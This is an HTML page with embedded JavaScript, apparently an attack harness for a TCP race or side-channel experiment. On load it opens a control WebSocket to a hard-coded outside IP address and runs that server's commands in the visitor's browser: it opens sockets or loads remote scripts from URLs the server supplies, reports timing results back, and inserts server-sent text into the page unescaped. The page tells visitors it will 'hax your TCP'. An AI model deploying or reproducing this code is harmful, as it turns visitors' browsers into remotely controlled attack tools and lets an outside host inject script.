<!DOCTYPE html>

<meta charset="utf-8" />

<title>TCP</title>

<script language="javascript" type="text/javascript">

try {

    var control_sock;
    var sock;

    function handleControlClose(evt)
    {
        console.log("Error: control websocket closed...reopening...");
        
        //init();
    }
    
    var imgTimeoutId;
    var raceState;  // 1 running
                    // 2 won
                    // 3 lost

    // Won the race
    function imgLoadTimeout()
    {
        if (raceState != 1) { 
            console.log('Error: timeout called with raceState ' + raceState);
            return;
        }
        control_sock.send("timeout");
        console.log("Won the race");
        raceState = 2;
    }
    // Lost the race
    function imgLoad()
    {
        if (raceState != 1) { 
            console.log('Error: imgLoad called with raceState ' + raceState);
            return;
        }
        clearTimeout(imgTimeoutId);
        control_sock.send("closed"); // Legacy...compat with websockets
        console.log("Lost the race");
        raceState = 3;
    }

    function initLoad()
    {
        clearTimeout(imgTimeoutId);
        control_sock.send("calmed");
        console.log("initialized....");
    }

    function imgError()
    {
        console.log('blah');
        clearTimeout(imgTimeoutId);
        control_sock.send("timeout");   // Another way to win the race (depending on the server)
        raceState = 2;
    }

    // We call it an Img, but really it's become a script TODO: make names make sense
    function makeImg(url, isinit)
    {
        // Kill old script element
        e = document.getElementById('img-element');
        e.parentNode.removeChild(e);

        e = document.createElement('script');
        e.id = 'img-element';
        if (isinit) {
            e.addEventListener("load", initLoad, false);
        } else {
            e.addEventListener("load", imgLoad, false);
        }
        e.src = url + '?' + Math.random();  // to kill caches and/or get us banned

        imgTimeoutId = setTimeout(imgLoadTimeout, 30000);
        raceState = 1;
        e.addEventListener("error", imgError, false);
        try {
            document.getElementById('img-container').appendChild(e);
        }catch (err) {
            console.log('I caught me an error - make it faster!!');
        }
    }

    var start_time;
    var win_threshold;
    function getTime()
    {
        var d = new Date();
        return d.getTime() / 1000.0;
    }

    function websocketTimeout()
    {
        console.log('websocket timeout');
        sock.close();
    }

    function makeWS(url, isinit)
    {
        try {
            start_time = getTime();
            var sock2 = new WebSocket(url);
            sock = sock2;

            if (!isinit)
                ws_timeout = setTimeout(websocketTimeout, 1500);

            sock.onopen = function(evt) {
                console.log("opened(" + sock.readyState + "): ");
                console.log(evt);
                control_sock.send("opened");
            };
            sock.onclose = function(evt) { 
                var diff = getTime() - start_time;
                if (isinit) {
                    win_threshold = diff / 2; 
                    console.log("setting win threshold to " + win_threshold);
                    control_sock.send("calmed");
                    return;
                }
                clearTimeout(ws_timeout);
                if (diff < win_threshold) {
                    // Won the race
                    console.log("Won: " + diff);
                    control_sock.send("timeout");
                } else {
                    // Lost the race
                    console.log("Lost: " + diff);
                    control_sock.send("closed");
                }
            };
            sock.onerror = function(evt) { 
                console.log("error(" + sock.readyState + "): ");
                console.log(evt);
                control_sock.send("error");
            };
            sock.onmessage = function(evt) { 
                console.log("data: " + evt);
                control_sock.send("data");
            };

        } catch (err) {
            console.log("ERROR");
            console.log(err);
        }
    }

    function handleControlMessage(evt)
    {
        console.log("control: " + evt.data);
        if (evt.data.substr(0, "make".length) == "make") {
            url = evt.data.substr("make ".length)
            makeWS(url, false);
        } else if (evt.data.substr(0, "img".length) == "img") {
            url = evt.data.substr("img ".length)
            makeImg(url, false);
        } else if (evt.data.substr(0, "kill".length) == "kill") {
            sock.onclose = function(evt) { console.log('killed sock') };
            sock.close();
            sock = null;
        } else if (evt.data.substr(0, "calm".length) == "calm") {
            url = evt.data.substr("calm ".length);
            makeWS(url, true);
            //makeImg(url, true);
        } else if (evt.data.substr(0, "show".length) == "show") {
            data = evt.data.substr("show ".length) 
            document.getElementById('output').innerHTML += "<br/>" + data
        }
    }

    function init()
    {
        if (! ("WebSocket" in window)) WebSocket = MozWebSocket; // firefox
        control_sock = new WebSocket("ws://141.212.109.239:8080/");
        control_sock.onopen = function(evt) { console.log("Opened control websocket") };
        control_sock.onclose = handleControlClose;
        control_sock.onerror = handleControlClose;
        control_sock.onmessage = handleControlMessage;
        window.onerror = function(evt) {
            console.log("window err: " + evt);
        }
    }

    window.addEventListener("load", init, false);
} catch (err) {
    console.log("big giant exception (" + sock.readyState + "): " + err);
}
</script>
<center>
<h1>Hi</h1>
Please wait while we hax your TCP. Thank you.


<h2>FIN</h2>
<div id="output"></div>

<div id="img-container">
<script id="img-element"></script>
</div>

</center>
</html>
